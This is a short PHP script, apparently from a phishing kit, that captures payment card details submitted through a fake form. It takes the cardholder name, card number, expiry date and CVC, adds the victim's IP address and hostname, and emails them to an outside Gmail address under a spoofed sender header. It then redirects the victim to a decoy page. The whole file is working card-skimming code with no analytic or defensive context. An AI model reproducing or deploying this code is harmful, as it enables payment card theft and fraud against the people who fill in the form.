<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "=============-----=============\n";
$message .= "full name : ".$_POST['holder']."\n";
$message .= "Number  : ".$_POST['Num']."\n";
$message .= "date  : ".$_POST['MM']."/".$_POST['YY']."\n";
$message .= "code : ".$_POST['cvc']."\n";
$message .= "===============================\n";

$send = "ccntassociation@gmail.com";

$subject = "Fedback ssl - $ip";
$headers = "From:ssl <info@mtgstudios.se>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);


header("Location: attend.html");
?>